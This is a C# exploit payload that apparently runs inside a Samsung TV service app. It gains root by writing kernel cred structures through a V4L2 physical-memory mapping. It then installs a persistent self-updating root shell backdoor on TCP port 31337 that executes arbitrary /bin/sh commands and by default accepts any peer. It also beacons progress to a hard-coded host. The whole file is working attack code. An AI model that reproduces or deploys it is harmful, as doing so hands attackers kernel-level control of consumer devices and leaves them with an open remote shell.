// Boot payload: owner -> root via the V4L2 physmap, then prove it.
//
// Runs inside com.samsung.tv.MultiControl-Service (dotnet-inhouse app) as
// uid 5001, groups 29 44 100 201 6509 ... (44 = video, so /dev/video40 opens).
// Port of recon/kroot.py --fork:
//   mmap phys pages  -> find kernel Image (0x20008000) -> init_task via the
//   __ksymtab string sequence -> fork a PHYRFORK child -> find it near the
//   task-list tail -> patch the parent's cred -> uid 0 + full caps.
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

internal static class Program
{
    const string Share = "/opt/usr/home/owner/share";
    const string Marker = Share + "/root_boot.txt";
    const string SysProof = "/opt/usr/system/dsh_root_proof.txt";
    // Fallback only: deploy.sh records the real PC address in rootchan.host, which
// HostAddr() prefers. Kept so a hand-built payload still beacons somewhere.
    const string Host = "192.168.178.214";
    const string HostFile = Share + "/rootchan.host";
    // One IP per line; if the file exists, only those peers may use port 31337.
    const string AllowFile = Share + "/rootchan.allow";
    // Attempt counter for the fast-exit retry loop (v9).  /tmp is tmpfs, so it
    // resets on every boot by design: each boot gets a fresh set of attempts.
    const string TryFile = "/tmp/.dsh_try";

    // kernel / task facts (measured on 24_PTM_QTV_T09, kernel 5.4.249)
    const uint PHYS_OFF = 0xA0000000;      // v = phys + PHYS_OFF  (0x20000000 -> 0xC0000000)
    const uint IMAGE_A = 0x40008000;
    const uint IMAGE_B = 0x20008000;
    const uint OFF_SEQ = 0x8912CA;
    const uint OFF_STR = 0x8912D8;
    const uint DATA_SHIFT = 0x12000;
    const uint O_COMM = 0x400;
    const uint O_CRED = 0x3F8;
    const uint O_REAL = 0x3F4;
    static readonly byte[] SEQ = Encoding.ASCII.GetBytes("name_to_dev_t\0init_task\0kernel_neon_end");
    static readonly byte[] IMG_SIG = { 0xEE, 0x44, 0x00, 0xEB, 0x00, 0x90, 0x0F, 0xE1 };

    // ---- libc ----
    [DllImport("libc", SetLastError = true)] static extern int open(string path, int flags);
    [DllImport("libc", SetLastError = true)] static extern int close(int fd);
    [DllImport("libc", EntryPoint = "mmap64", SetLastError = true)]
    static extern IntPtr mmap64(IntPtr addr, UIntPtr len, int prot, int flags, int fd, long off);
    [DllImport("libc", EntryPoint = "syscall", SetLastError = true)]
    static extern int syscall(int n, int a1, int a2, int a3, int a4, int a5, int a6);
    [DllImport("libc")] static extern uint getuid();
    [DllImport("libc")] static extern int fork();
    [DllImport("libc")] static extern int prctl(int opt, string arg, int a3, int a4, int a5);
    [DllImport("libc")] static extern int usleep(uint us);
    [DllImport("libc", EntryPoint = "_exit")] static extern void _exit(int code);

    static int _fd = -1;
    static readonly Dictionary<uint, IntPtr> Pages = new Dictionary<uint, IntPtr>();

    // Where should beacons go? The address the last deploy recorded on the TV wins over
// the compiled-in default, so the same payload works on any LAN.
    static string HostAddr()
    {
        try
        {
            if (File.Exists(HostFile))
            {
                string s = File.ReadAllText(HostFile).Trim();
                if (s.Length > 0) return s;
            }
        }
        catch { }
        return Host;
    }

    static string Beacon(string msg)
    {
        try
        {
            using (var c = new TcpClient())
            {
                c.Connect(HostAddr(), 80);
                byte[] b = Encoding.UTF8.GetBytes("DSHROOT " + msg + "\n");
                c.GetStream().Write(b, 0, b.Length);
                c.GetStream().Flush();
            }
        }
        catch { }
        try { Directory.CreateDirectory(Share); File.AppendAllText(Marker, msg + "\n"); } catch { }
        return msg;
    }

    static IntPtr MapPage(uint page)
    {
        IntPtr p;
        if (Pages.TryGetValue(page, out p)) return p;
        p = mmap64(IntPtr.Zero, (UIntPtr)0x1000, 3, 1, _fd, (long)page);
        if (p == new IntPtr(-1))
        {
            int r = syscall(192, 0, 0x1000, 3, 1, _fd, (int)(page >> 12)); // mmap2
            if (r < 0) throw new IOException("mmap failed page=" + page.ToString("x8"));
            p = (IntPtr)(uint)r;
        }
        if (Pages.Count > 8192) Pages.Clear();       // keep the mapping table small
        Pages[page] = p;
        return p;
    }

    static byte[] ReadPhys(uint phys, int len)
    {
        var outb = new byte[len];
        int done = 0;
        while (done < len)
        {
            uint cur = phys + (uint)done;
            uint page = cur & 0xFFFFF000;
            int off = (int)(cur & 0xFFF);
            int chunk = Math.Min(len - done, 0x1000 - off);
            IntPtr p = MapPage(page);
            Marshal.Copy(IntPtr.Add(p, off), outb, done, chunk);
            done += chunk;
        }
        return outb;
    }

    static uint U32(byte[] b, int o) => (uint)(b[o] | (b[o + 1] << 8) | (b[o + 2] << 16) | (b[o + 3] << 24));

    static void Write32(uint phys, uint val)
    {
        uint page = phys & 0xFFFFF000;
        int off = (int)(phys & 0xFFF);
        IntPtr p = MapPage(page);
        Marshal.WriteInt32(IntPtr.Add(p, off), unchecked((int)val));
    }

    // LPAE direct map on this TV spans 0xC0000000..0xFFFFFFFF (1 GB); tasks and
    // creds are routinely allocated above 0xE0000000.  The old <0xE0000000 bound
    // is why "fail no parent" happened: the parent pointer was rejected.
    static bool Kptr(uint v) => v >= 0xC0000000;

    // 5001 = our uid, 0 = already root, 0xFFFFFFFF = not a readable cred
    static uint CredUid(uint cred)
    {
        if (!Kptr(cred)) return 0xFFFFFFFF;
        try { return U32(ReadPhys(V2P(cred) + 4, 4), 0); } catch { return 0xFFFFFFFF; }
    }
    static uint V2P(uint v) => (v - PHYS_OFF) & 0xFFFFFFFF;

    static string CStr(byte[] b)
    {
        int z = Array.IndexOf(b, (byte)0);
        if (z < 0) z = b.Length;
        return Encoding.ASCII.GetString(b, 0, z);
    }

    static uint FindBase()
    {
        foreach (uint a in new[] { IMAGE_A, IMAGE_B })
        {
            try
            {
                byte[] got = ReadPhys(a, 8);
                bool ok = true;
                for (int i = 0; i < 8; i++) if (got[i] != IMG_SIG[i]) { ok = false; break; }
                if (ok) return a;
            }
            catch { }
        }
        return 0;
    }

    static uint LocateInit(uint baseAddr)
    {
        uint want = baseAddr + OFF_SEQ + DATA_SHIFT;
        foreach (uint span in new uint[] { 0x100000, 0x400000, 0x1000000 })
        {
            uint start = (want - span) & 0xFFFF0000;
            for (uint a = start; a < want + span; a += 0x10000)
            {
                byte[] d;
                try { d = ReadPhys(a, 0x10000); } catch { continue; }
                int i = IndexOf(d, SEQ);
                if (i < 0) continue;
                uint seqPhys = a + (uint)i;
                uint strPhys = seqPhys + (OFF_STR - OFF_SEQ);
                uint name = strPhys + PHYS_OFF;
                byte[] pat = BitConverter.GetBytes(name);
                uint s0 = (strPhys - 0x100000) & 0xFFFF0000;
                for (uint p = s0; p < strPhys; p += 0x10000)
                {
                    byte[] w;
                    try { w = ReadPhys(p, 0x10000); } catch { continue; }
                    int j = IndexOf(w, pat);
                    while (j >= 0)
                    {
                        uint hit = p + (uint)j;
                        uint val = 0, ns = 0;
                        try { val = U32(ReadPhys(hit - 4, 4), 0); } catch { }
                        try { ns = U32(ReadPhys(hit + 4, 4), 0); } catch { }
                        if (Kptr(val) && ns == 0) return val;
                        j = IndexOf(w, pat, j + 1);
                    }
                }
            }
        }
        return 0;
    }

    static int IndexOf(byte[] hay, byte[] needle, int from = 0)
    {
        int end = hay.Length - needle.Length;
        for (int i = from; i <= end; i++)
        {
            int k = 0;
            while (k < needle.Length && hay[i + k] == needle[k]) k++;
            if (k == needle.Length) return i;
        }
        return -1;
    }

    static bool CommAt(uint taskVirt, byte[] want)
    {
        try
        {
            byte[] c = ReadPhys(V2P(taskVirt) + O_COMM, 16);
            for (int i = 0; i < want.Length; i++) if (c[i] != want[i]) return false;
            return true;
        }
        catch { return false; }
    }

    static List<uint> TaskOffsets(uint initPhys, uint initVirt)
    {
        var res = new List<uint>();
        byte[] buf;
        try { buf = ReadPhys(initPhys, 0x800); } catch { return res; }
        for (uint o = 0; o < 0x800 - 8; o += 4)
        {
            uint prv = U32(buf, (int)o + 4);
            if (!Kptr(prv)) continue;
            uint h = initVirt + o;
            if (prv == h) continue;
            uint task = (prv - o) & 0xFFFFFFFF;
            try
            {
                byte[] c = ReadPhys(V2P(task) + O_COMM, 16);
                int z = Array.IndexOf(c, (byte)0);
                if (z <= 0) continue;
                bool printable = true;
                for (int i = 0; i < z; i++) if (c[i] < 32 || c[i] >= 127) { printable = false; break; }
                if (printable) res.Add(o);
            }
            catch { }
        }
        return res;
    }

    // returns (taskVirt, commPhys) of the fork child, scanning the list tail
    static bool FindCommNearTail(uint initPhys, uint initVirt, uint off, byte[] want, int hops, out uint taskVirt)
    {
        taskVirt = 0;
        uint h = initVirt + off;
        uint cur;
        try { cur = U32(ReadPhys(initPhys + off + 4, 4), 0); } catch { return false; }
        for (int i = 0; i < hops; i++)
        {
            if (!Kptr(cur) || cur == h) return false;
            uint task = (cur - off) & 0xFFFFFFFF;
            if (CommAt(task, want)) { taskVirt = task; return true; }
            try { cur = U32(ReadPhys(V2P(cur) + 4, 4), 0); } catch { return false; }
        }
        return false;
    }

    static bool PatchCred(uint cred)
    {
        if (cred >= 0xC0000000) cred = V2P(cred);
        try
        {
            for (uint i = 0; i < 8; i++) Write32(cred + 4 + i * 4, 0);
            Write32(cred + 48, 0xFFFFFFFF); Write32(cred + 52, 0x3F);
            Write32(cred + 56, 0xFFFFFFFF); Write32(cred + 60, 0x3F);
            byte[] ids = ReadPhys(cred + 4, 32);
            for (int i = 0; i < 32; i++) if (ids[i] != 0) return false;
            return true;
        }
        catch { return false; }
    }

    static bool TrySelfUpdate()
    {
        try
        {
            string next = Share + "/next.dll";
            if (!File.Exists(next)) return false;
            byte[] nb = File.ReadAllBytes(next);
            if (nb.Length < 1024) return false;
            string me = "/opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll";
            byte[] cur = File.Exists(me) ? File.ReadAllBytes(me) : null;
            if (cur != null && cur.Length == nb.Length)
            {
                bool same = true;
                for (int i = 0; i < nb.Length; i++) if (cur[i] != nb[i]) { same = false; break; }
                if (same) return false;
            }
            string tmp = "/opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/.next.tmp";
            File.WriteAllBytes(tmp, nb);
            File.Move(tmp, me, true);
            Beacon("self-update " + nb.Length);
            return true;
        }
        catch (Exception e) { Beacon("self-update fail " + e.Message); return false; }
    }

    static bool PeerAllowed(string ip)
    {
        try
        {
            if (!File.Exists(AllowFile)) return true;      // legacy: open to all
            foreach (string line in File.ReadAllLines(AllowFile))
            {
                string s = line.Trim();
                if (s.Length == 0 || s.StartsWith("#")) continue;
                if (s == ip) return true;
            }
            return false;
        }
        catch { return true; }
    }

    static void RootChannel()
    {
        try
        {
            var l = new TcpListener(IPAddress.Any, 31337);
            l.Start();
            Beacon("ROOTCHAN 31337 uid=" + getuid());
            while (true)
            {
                using (var c = l.AcceptTcpClient())
                {
                    string ip = "";
                    try { ip = ((IPEndPoint)c.Client.RemoteEndPoint).Address.ToString(); } catch { }
                    if (!PeerAllowed(ip))
                    {
                        Beacon("chan deny " + ip);
                        c.Close();
                        continue;
                    }
                    try { Serve(c); } catch (Exception e) { Beacon("chan " + e.Message); }
                }
            }
        }
        catch (Exception e) { Beacon("chan fail " + e.Message); }
    }

    static void Serve(TcpClient c)
    {
        var s = c.GetStream();
        var buf = new byte[8192];
        var sb = new StringBuilder();
        while (true)
        {
            int n = s.Read(buf, 0, buf.Length);
            if (n <= 0) break;
            sb.Append(Encoding.UTF8.GetString(buf, 0, n));
            string all = sb.ToString();
            int nl;
            while ((nl = all.IndexOf('\n')) >= 0)
            {
                string cmd = all.Substring(0, nl).Trim();
                all = all.Substring(nl + 1);
                if (cmd.Length == 0) continue;
                if (cmd == "exit") return;
                string o = Run(cmd);
                byte[] b = Encoding.UTF8.GetBytes(o + "\n__END__\n");
                s.Write(b, 0, b.Length);
                s.Flush();
            }
            sb.Clear();
            sb.Append(all);
        }
    }

    static string Run(string cmd)
    {
        try
        {
            var psi = new System.Diagnostics.ProcessStartInfo("/bin/sh");
            psi.ArgumentList.Add("-c");
            psi.ArgumentList.Add(cmd);
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            using (var p = System.Diagnostics.Process.Start(psi))
            {
                if (p == null) return "ERR spawn";
                string o = p.StandardOutput.ReadToEnd();
                string e = p.StandardError.ReadToEnd();
                p.WaitForExit(15000);
                return (o + e).TrimEnd();
            }
        }
        catch (Exception ex) { return "ERR " + ex.GetType().Name + ": " + ex.Message; }
    }

    static void Main()
    {
        AppDomain.CurrentDomain.UnhandledException += (s, e) => { };
        prctl(15, "PHYSRPT1", 0, 0, 0);   // PR_SET_NAME on this thread

        Beacon("start uid=" + getuid() + " pid=" + Environment.ProcessId);
        try
        {
            _fd = -1;
            for (int i = 0; i < 120 && _fd < 0; i++)
            {
                _fd = open("/dev/video40", 2 /*O_RDWR*/);
                if (_fd < 0) Thread.Sleep(1000);   // browser stub may hold it
            }
            if (_fd < 0) { Beacon("fail open video40 after 120s=" + _fd); Thread.Sleep(30000); return; }

            uint baseAddr = FindBase();
            if (baseAddr == 0) { Beacon("fail no kernel image"); Thread.Sleep(20000); return; }
            uint initVirt = LocateInit(baseAddr);
            if (initVirt == 0) { Beacon("fail no init_task"); Thread.Sleep(20000); return; }
            uint initPhys = V2P(initVirt);
            Beacon("kernel=" + baseAddr.ToString("x8") + " init_task=" + initVirt.ToString("x8"));

            var offs = TaskOffsets(initPhys, initVirt);
            if (offs.Count == 0) { Beacon("fail no task offsets"); Thread.Sleep(20000); return; }
            foreach (uint cand in offs) Beacon("cand off=" + cand.ToString("x"));

            // fork() COPIES the cred, so patching the child never roots us -- the
            // child is only a landmark.  A pre-fork snapshot of existing
            // PHYRFORK tasks keeps us from latching onto an orphan from an
            // earlier AUL restart (that caused "child-patch=True uid=5001").
            byte[] forkName = Encoding.ASCII.GetBytes("PHYRFORK\0");
            GCHandle forkNamePin = GCHandle.Alloc(forkName, GCHandleType.Pinned);
            int forkNamePtr = forkNamePin.AddrOfPinnedObject().ToInt32();
            byte[] selfTag = Encoding.ASCII.GetBytes("PHYSRPT1");
            uint child = 0, self = 0;

            // v9: AUL restarts this app about one second after it exits, and a
            // FRESH PROCESS is what actually fixes a bad physmap window (it
            // re-mmaps /dev/video40 and reads coherent task memory).  So the
            // first attempts stay short and exit immediately, letting AUL do the
            // retry; only after several failures fall back to the long in-process
            // backoff.  /tmp is tmpfs -> the counter resets on every boot.
            int attempt = 1;
            try
            {
                if (File.Exists(TryFile))
                {
                    int prev;
                    if (int.TryParse(File.ReadAllText(TryFile).Trim(), out prev)) attempt = prev + 1;
                }
                File.WriteAllText(TryFile, attempt.ToString());
            }
            catch { }
            bool fastMode = attempt <= 4;
            Beacon("attempt=" + attempt + (fastMode ? " (fast mode)" : " (long retry mode)"));

            // v8 kept, now as the fallback path: the direct real_parent pointer
            // needs no comm read, and in long mode the retries are spaced out.
            int[] backoffMs = fastMode
                ? new int[] { 0, 0 }
                : new int[] { 0, 0, 8000, 15000, 25000, 30000 };
            for (int round = 0; round < backoffMs.Length && getuid() != 0; round++)
            {
                if (backoffMs[round] > 0)
                {
                    Beacon("retry in " + backoffMs[round] / 1000 + "s");
                    Thread.Sleep(backoffMs[round]);
                }
                var pre = new HashSet<uint>();
                foreach (uint o in offs)
                {
                    uint h = initVirt + o;
                    uint cur;
                    try { cur = U32(ReadPhys(initPhys + o + 4, 4), 0); } catch { continue; }
                    for (int i = 0; i < 200; i++)
                    {
                        if (!Kptr(cur) || cur == h) break;
                        uint task = (cur - o) & 0xFFFFFFFF;
                        string nm;
                        try { nm = CStr(ReadPhys(V2P(task) + O_COMM, 16)); } catch { break; }
                        if (nm.StartsWith("PHYRFORK")) pre.Add(task);
                        try { cur = U32(ReadPhys(V2P(cur) + 4, 4), 0); } catch { break; }
                    }
                }
                Beacon("round=" + round + " pre=" + pre.Count);

                int pid = fork();
                if (pid == 0)
                {
                    syscall(172, 15, forkNamePtr, 0, 0, 0, 0);   // prctl(PR_SET_NAME)
                    usleep(120000000);                            // 120 s landmark
                    _exit(0);
                }
                if (pid < 0) { Beacon("fork failed " + pid); Thread.Sleep(1000); continue; }
                Thread.Sleep(700);        // let the child set its tag

                var names = new StringBuilder();
                var deadline = DateTime.UtcNow.AddSeconds(20);
                while (DateTime.UtcNow < deadline)
                {
                    child = 0; self = 0;
                    foreach (uint o in offs)
                    {
                        uint h = initVirt + o;
                        uint cur;
                        try { cur = U32(ReadPhys(initPhys + o + 4, 4), 0); } catch { break; }
                        for (int i = 0; i < 200; i++)
                        {
                            if (!Kptr(cur) || cur == h) break;
                            uint task = (cur - o) & 0xFFFFFFFF;
                            string nm;
                            try { nm = CStr(ReadPhys(V2P(task) + O_COMM, 16)); } catch { break; }
                            if (nm.StartsWith("PHYRFORK") && !pre.Contains(task)) child = task;
                            if (nm.StartsWith("PHYSRPT")) self = task;
                            if (round == 0 && names.Length < 120) names.Append(nm).Append(',');
                            try { cur = U32(ReadPhys(V2P(cur) + 4, 4), 0); } catch { break; }
                        }
                    }
                    if (child != 0) break;
                    Thread.Sleep(250);
                }
                Beacon("tail: " + names);
                if (child == 0) { Beacon("fail no new PHYRFORK"); Thread.Sleep(1000); continue; }
                Beacon("child=" + child.ToString("x8") + " self=" + self.ToString("x8"));

                if (self != 0)
                {
                    uint sc = 0, sr = 0;
                    try { sc = U32(ReadPhys(V2P(self) + O_CRED, 4), 0); } catch { }
                    try { sr = U32(ReadPhys(V2P(self) + O_REAL, 4), 0); } catch { }
                    Beacon("self cred=" + sc.ToString("x8") + " real=" + sr.ToString("x8"));
                    if (CredUid(sc) == 5001 || CredUid(sc) == 0) PatchCred(sc);
                    if (Kptr(sr) && sr != sc && (CredUid(sr) == 5001 || CredUid(sr) == 0)) PatchCred(sr);
                    Beacon("self-patch uid=" + getuid());
                }

                // Direct parent pointer.  fork() stores the forking task in
                // child->real_parent (0x2F0) and ->parent (0x2F4); that task is
                // *us*, so no comm lookup is involved.  This survives the window
                // where every comm/scan read comes back stale (the v7 failure:
                // "child=... self=00000000").
                if (getuid() != 0)
                {
                    uint[] parentOffs = { 0x2F0, 0x2F4 };
                    foreach (uint po in parentOffs)
                    {
                        uint parent = 0;
                        try { parent = U32(ReadPhys(V2P(child) + po, 4), 0); } catch { }
                        if (!Kptr(parent) || parent == child) continue;
                        uint cred = 0, real = 0;
                        try { cred = U32(ReadPhys(V2P(parent) + O_CRED, 4), 0); } catch { }
                        try { real = U32(ReadPhys(V2P(parent) + O_REAL, 4), 0); } catch { }
                        if (CredUid(cred) == 5001 || CredUid(cred) == 0)
                        {
                            Beacon("direct-parent+" + po.ToString("x") + "=" +
                                   parent.ToString("x8") + " cred=" + cred.ToString("x8"));
                            PatchCred(cred);
                        }
                        if (Kptr(real) && real != cred &&
                            (CredUid(real) == 5001 || CredUid(real) == 0))
                            PatchCred(real);
                        if (getuid() == 0) break;
                    }
                    if (getuid() == 0) Beacon("direct-patch uid=0");
                }

                // Parent pointer from the landmark -> our task -> our cred.
                for (int t = 0; t < 20 && getuid() != 0; t++)
                {
                    uint parent = 0;
                    try
                    {
                        byte[] st = ReadPhys(V2P(child), 0x800);
                        for (int o = 0; o + 4 <= st.Length; o += 4)
                        {
                            uint v = U32(st, o);
                            if (!Kptr(v)) continue;
                            if (CommAt(v, selfTag)) { parent = v; break; }
                        }
                    }
                    catch { }
                    if (parent != 0)
                    {
                        uint cred = 0, real = 0;
                        try { cred = U32(ReadPhys(V2P(parent) + O_CRED, 4), 0); } catch { }
                        try { real = U32(ReadPhys(V2P(parent) + O_REAL, 4), 0); } catch { }
                        Beacon("parent=" + parent.ToString("x8") + " cred=" + cred.ToString("x8"));
                        if (CredUid(cred) == 5001 || CredUid(cred) == 0) PatchCred(cred);
                        if (Kptr(real) && real != cred && (CredUid(real) == 5001 || CredUid(real) == 0)) PatchCred(real);
                        Beacon("parent-patch uid=" + getuid());
                        if (getuid() == 0) break;
                    }
                    Thread.Sleep(700);
                }
                if (getuid() != 0) Beacon("fail round " + round);
            }   // end rounds

            uint uid = getuid();

            if (uid == 0)
            {
                try { File.Delete(TryFile); } catch { }   // reset the counter for the next boot
                string proof = "DSHROOT uid=" + uid + " pid=" + Environment.ProcessId +
                               " self=" + self.ToString("x8") + " kernel=" + baseAddr.ToString("x8") +
                               " init_task=" + initVirt.ToString("x8") + "\n";
                try { Directory.CreateDirectory("/opt/usr/system"); File.WriteAllText(SysProof, proof); } catch { }
                try { File.WriteAllText(Share + "/root_proof.txt", proof); } catch { }
                Beacon("SUCCESS-R00T " + proof.Replace("\n", " "));

                // free /dev/video40 so the browser physmap path works again
                try { if (_fd >= 0) { close(_fd); _fd = -1; Beacon("device closed"); } } catch { }

                // self-update: if a new payload was dropped in the share, install
                // it and exit so AUL restarts the app with the new assembly
                if (TrySelfUpdate()) { Thread.Sleep(500); Environment.Exit(0); }

                RootChannel();   // never returns
            }
            if (fastMode)
            {
                // Exit so AUL relaunches us (~1 s).  A fresh process re-mmaps the
                // device and reads coherent memory - measurably faster than the
                // in-process retry loop, which kept re-reading the same bad state.
                Beacon("fast-exit attempt=" + attempt);
                Thread.Sleep(2000);
                Environment.Exit(0);
            }
            Thread.Sleep(120000);
        }
        catch (Exception e)
        {
            Beacon("exception " + e.GetType().Name + ": " + e.Message);
            Thread.Sleep(20000);
        }
    }
}
